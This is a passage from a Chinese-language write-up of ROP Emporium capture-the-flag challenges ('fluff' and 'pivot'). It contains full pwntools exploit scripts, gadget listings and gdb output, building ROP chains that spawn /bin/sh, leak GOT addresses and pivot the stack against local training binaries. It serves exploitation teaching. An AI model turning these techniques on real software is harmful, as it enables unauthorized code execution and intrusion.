0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
```
```python
from pwn import *

system_plt = 0x004005e0
data_addr  = 0x0000000000601050

xor_r11_r11 = 0x0000000000400822
xor_r11_r12 = 0x000000000040082f
xchg_r11_r10 = 0x0000000000400840
mov_r10_r11 = 0x000000000040084c
pop_r12 = 0x0000000000400832

def write_data(data, addr):
    # addr -> r10
    payload = ""
    payload += p64(xor_r11_r11)
    payload += "BBBBBBBB"
    payload += p64(pop_r12)
    payload += p64(addr)
    payload += p64(xor_r11_r12)
    payload += "BBBBBBBB"
    payload += p64(xchg_r11_r10)
    payload += "BBBBBBBB"
    
    # data -> r11
    payload += p64(xor_r11_r11)
    payload += "BBBBBBBB"
    payload += p64(pop_r12)
    payload += data
    payload += p64(xor_r11_r12)
    payload += "BBBBBBBB"
    
    # r11 -> [r10]
    payload += p64(mov_r10_r11)
    payload += "BBBBBBBB"*2
    payload += p64(0)
    
    return payload

payload = ""
payload += "A"*40
payload += write_data("/bin/sh\x00", data_addr)
payload += p64(system_plt)

io = process('./fluff')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

## pivot
这个程序有两次输入，第一次输入放在一个由 `malloc()` 函数分配的地址上，未了降低难度，特地把这个地址打印了出来，第二次的输入放在一个大小限制为 13 字节的栈上，所以我们把主要的逻辑由第一次输入，而第二次主要用于跳转到第一次的地址上，这里利用了 leave 指令，即 `mov esp, ebp; pop ebp`。

首先我们默认是开启 ASLR 的，这样共享库地址是动态的，我们需要利用 gadgets 泄露出函数 `foothold_function()` 的内存地址，通过相对位置计算得到我们的目标函数 `ret2win()` 的地址。
```
gdb-peda$ disassemble foothold_function
Dump of assembler code for function foothold_function@plt:
   0x080485f0 <+0>:     jmp    DWORD PTR ds:0x804a024
   0x080485f6 <+6>:     push   0x30
   0x080485fb <+11>:    jmp    0x8048580
End of assembler dump.
gdb-peda$ x/5x 0x804a024
0x804a024:      0x080485f6      0x08048606      0x08048616      0x08048626
0x804a034:      0x00000000
```
所以 `foothold_function()` 的 plt 地址为 `0x080485f0`，got.plt 地址为 `0x804a024`。

```
$ ropgadget --binary pivot32 --only "mov|pop|ret|add|call"
...
0x080488c4 : mov eax, dword ptr [eax] ; ret
0x080488c0 : pop eax ; ret
0x08048571 : pop ebx ; ret
0x080488c7 : add eax, ebx ; ret
0x080486a3 : call eax
```
exp 如下：
```python
from pwn import *

#context.log_level = 'debug'
#context.terminal = ['konsole']
io = process('./pivot32')
elf = ELF('./pivot32')
libp = ELF('./libpivot32.so')

leave_ret = 0x0804889f

foothold_plt     = elf.plt['foothold_function'] # 0x080485f0
foothold_got_plt = elf.got['foothold_function'] # 0x804a024

pop_eax      = 0x080488c0
pop_ebx      = 0x08048571
mov_eax_eax  = 0x080488c4
add_eax_ebx  = 0x080488c7
call_eax     = 0x080486a3

foothold_sym = libp.symbols['foothold_function']
ret2win_sym  = libp.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) # 0x1f7

leakaddr  = int(io.recv().split()[20], 16)

# calls foothold_function() to populate its GOT entry, then queries that value into EAX
#gdb.attach(io)
payload_1 = ""
payload_1 += p32(foothold_plt)
payload_1 += p32(pop_eax)
payload_1 += p32(foothold_got_plt)
payload_1 += p32(mov_eax_eax)
payload_1 += p32(pop_ebx)
payload_1 += p32(offset)
payload_1 += p32(add_eax_ebx)
payload_1 += p32(call_eax)

io.sendline(payload_1)

# ebp = leakaddr-4, esp = leave_ret
payload_2 = ""
payload_2 += "A"*40
payload_2 += p32(leakaddr-4) + p32(leave_ret)

io.sendline(payload_2)

print io.recvall()
```

下面是 64 位程序（在我的电脑上 leave_ret 的地址中含有 `0a`，所以采用 gadget 来设置 rsp，这种情况不一定有）：
```
$ ropgadget --binary pivot --only "mov|pop|call|add|xchg|ret"
0x0000000000400b09 : add rax, rbp ; ret
0x000000000040098e : call rax
0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
0x0000000000400b00 : pop rax ; ret
0x0000000000400900 : pop rbp ; ret
0x0000000000400b02 : xchg rax, rsp ; ret
```
```python
from pwn import *

#context.log_level = 'debug'
#context.terminal = ['konsole']
io = process('./pivot')
elf = ELF('./pivot')
libp = ELF('./libpivot.so')

leave_ret = 0x0000000000400adf

foothold_plt     = elf.plt['foothold_function'] # 0x400850
foothold_got_plt = elf.got['foothold_function'] # 0x602048

pop_rax      = 0x0000000000400b00
pop_rbp      = 0x0000000000400900
mov_rax_rax  = 0x0000000000400b05
xchg_rax_rsp = 0x0000000000400b02
add_rax_rbp  = 0x0000000000400b09
call_rax     = 0x000000000040098e

foothold_sym = libp.symbols['foothold_function']
ret2win_sym  = libp.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) # 0x14e

leakaddr  = int(io.recv().split()[20], 16)

# calls foothold_function() to populate its GOT entry, then queries that value into EAX
#gdb.attach(io)
payload_1 = ""
payload_1 += p64(foothold_plt)
payload_1 += p64(pop_rax)
payload_1 += p64(foothold_got_plt)
payload_1 += p64(mov_rax_rax)
payload_1 += p64(pop_rbp)
payload_1 += p64(offset)
payload_1 += p64(add_rax_rbp)
payload_1 += p64(call_rax)

io.sendline(payload_1)

# rsp = leakaddr
payload_2 = ""
payload_2 += "A" * 40
payload_2 += p64(pop_rax)
payload_2 += p64(leakaddr)
payload_2 += p64(xchg_rax_rsp)

io.sendline(payload_2)

print io.recvall()
```
